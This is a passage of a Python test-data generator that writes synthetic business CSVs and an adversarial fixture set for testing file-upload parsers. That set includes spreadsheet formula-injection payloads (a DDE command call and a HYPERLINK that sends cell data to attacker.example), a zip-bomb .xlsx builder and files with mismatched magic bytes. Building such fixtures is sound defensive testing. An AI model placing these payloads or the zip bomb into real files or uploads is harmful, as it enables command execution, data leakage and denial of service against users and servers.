        "products": len(products),
        "duplicate_pairs": len(dup_pairs),
        "variant_families": len(variant_families),
        "orders": len(order_rows),
        "tickets": len(ticket_rows),
    }


# ------------------------------------------------------------------------------------------- adversarial
FORMULA_PAYLOADS = [
    "=1+1",
    "=cmd|' /C calc'!A0",
    "+SUM(1,2)",
    "-2+3",
    "@SUM(A1:A2)",
    "\t=1+1",
    "\r=1+1",
    '=HYPERLINK("http://attacker.example/?x="&A1,"click")',
    '=IMPORTXML(CONCAT("http://x.example/",A2),"//a")',
    "-10",  # a plain negative number is NOT a formula
]

_XLSX_CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    "</Types>"
)
_XLSX_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
    "</Relationships>"
)
_XLSX_WORKBOOK = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
)
_XLSX_WB_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    "</Relationships>"
)


def _fixed_zipinfo(name: str) -> zipfile.ZipInfo:
    zi = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))  # fixed timestamp => byte-identical output
    zi.compress_type = zipfile.ZIP_DEFLATED
    zi.external_attr = 0o644 << 16
    return zi


def write_zip_bomb_xlsx(path: Path, uncompressed_mb: int = 64) -> dict:
    """A structurally valid .xlsx whose sheet expands ~1000:1 (well above the ratio-100 guard)."""
    row = '<row><c t="inlineStr"><is><t>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</t></is></c></row>'
    target = uncompressed_mb * 1024 * 1024
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.writestr(_fixed_zipinfo("[Content_Types].xml"), _XLSX_CONTENT_TYPES)
        zf.writestr(_fixed_zipinfo("_rels/.rels"), _XLSX_RELS)
        zf.writestr(_fixed_zipinfo("xl/workbook.xml"), _XLSX_WORKBOOK)
        zf.writestr(_fixed_zipinfo("xl/_rels/workbook.xml.rels"), _XLSX_WB_RELS)
        with zf.open(_fixed_zipinfo("xl/worksheets/sheet1.xml"), "w", force_zip64=True) as sheet:
            head = b'<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
            sheet.write(head)
            chunk = (row * 4096).encode()
            written = len(head)
            while written < target:
                sheet.write(chunk)
                written += len(chunk)
            sheet.write(b"</sheetData></worksheet>")
    with zipfile.ZipFile(path) as zf:
        total = sum(i.file_size for i in zf.infolist())
    size = path.stat().st_size
    return {"compressed_bytes": size, "uncompressed_bytes": total, "ratio": round(total / size, 1)}


def gen_adversarial(out: Path) -> dict:
    adv = out / "adversarial"
    adv.mkdir(parents=True, exist_ok=True)
    rng = _rng("adversarial")

    # malformed.csv: ragged rows, unclosed quote, stray delimiter, NUL, invalid UTF-8, BOM, CRLF/LF mix
    malformed = io.BytesIO()
    malformed.write(b"\xef\xbb\xbforder_id,region,revenue\r\n")
    malformed.write(b"1,North,100.00\n")
    malformed.write(b"2,South\n")  # too few fields
    malformed.write(b"3,East,300.00,EXTRA,FIELDS\r\n")  # too many fields
    malformed.write(b'4,"West,400.00\n')  # unclosed quote swallows the next line
    malformed.write(b"5,Central,5\x0000.00\n")  # NUL byte
    malformed.write(b"6,\xff\xfeNorth,600.00\n")  # invalid UTF-8
    malformed.write(b"7;South;700.00\n")  # wrong delimiter
    malformed.write(b"8,North,not-a-number\n")
    (adv / "malformed.csv").write_bytes(malformed.getvalue())

    with (adv / "formula_injection.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(["id", "customer_name", "note", "amount_inr"])
        for i, payload in enumerate(FORMULA_PAYLOADS, 1):
            w.writerow([i, f"Synthetic Customer {i}", payload, f"{rng.uniform(10, 999):.2f}"])

    huge = "A" * (1024 * 1024 + 1)  # one cell just over 1 MiB (compresses to ~1 KB in git)
    with (adv / "huge_column.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(["id", "payload", "region"])
        w.writerow([1, huge, "North"])
        w.writerow([2, "small", "South"])

    with (adv / "wide_columns.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow([f"col_{i:04d}" for i in range(2000)])
        w.writerow([str(i) for i in range(2000)])

    bomb = write_zip_bomb_xlsx(adv / "zip_bomb.xlsx")
    # wrong magic bytes: content does not match the extension
    (adv / "png_as.csv").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(rng.randrange(256) for _ in range(256)))
    (adv / "text_as.xlsx").write_bytes(b"order_id,region\n1,North\n")  # not a zip
    (adv / "mz_as.csv").write_bytes(
        b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 120 + b"This program cannot be run"
    )
    return {"zip_bomb": bomb, "formula_payloads": len(FORMULA_PAYLOADS)}


# ------------------------------------------------------------------------------------------- main
GENERATORS = {
    "sales": lambda out, anchor: gen_sales(out, anchor),
    "customers": lambda out, anchor: gen_customers(out),
    "products": lambda out, anchor: gen_products(out),
    "churn": lambda out, anchor: gen_churn(out),
    "commerce": lambda out, anchor: gen_commerce(out, anchor),
    "adversarial": lambda out, anchor: gen_adversarial(out),
}


def _sha256(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as fh:
        for block in iter(lambda: fh.read(1 << 20), b""):
            h.update(block)
    return h.hexdigest()


def generate(out: Path = DEFAULT_OUT, anchor: dt.date | None = None, only: list[str] | None = None) -> dict:
    anchor = anchor or dt.date.today()
    out.mkdir(parents=True, exist_ok=True)
    stats = {name: fn(out, anchor) for name, fn in GENERATORS.items() if not only or name in only}
    files = sorted(p for p in out.rglob("*") if p.is_file() and p.name != "MANIFEST.json")
    manifest = {
        "seed": SEED,
        "anchor": anchor.isoformat(),
        "stats": stats,
        "files": {
            p.relative_to(out).as_posix(): {"bytes": p.stat().st_size, "sha256": _sha256(p)} for p in files
        },
    }
    if not only:
        (out / "MANIFEST.json").write_text(
            json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
    return manifest


def main(argv: list[str] | None = None) -> None:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--out", type=Path, default=DEFAULT_OUT)
    ap.add_argument("--anchor", type=dt.date.fromisoformat, default=None, help="YYYY-MM-DD (default: today)")
    ap.add_argument("--only", nargs="*", choices=sorted(GENERATORS))
    args = ap.parse_args(argv)
    manifest = generate(args.out, args.anchor, args.only)
    for name, info in manifest["files"].items():
        print(f"{info['bytes']:>12,}  {name}")


if __name__ == "__main__":
    main()
